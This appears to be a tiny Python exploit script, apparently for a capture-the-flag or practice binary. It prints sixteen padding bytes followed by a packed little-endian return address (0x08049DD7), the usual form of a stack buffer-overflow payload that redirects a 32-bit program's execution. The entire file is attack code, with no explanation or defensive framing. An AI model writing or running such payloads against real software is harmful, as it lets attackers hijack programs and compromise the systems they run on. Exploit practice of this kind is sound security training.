from struct import pack
import sys

sys.stdout.buffer.write(bytes.fromhex('00'*16) + pack("<I",0x08049DD7))
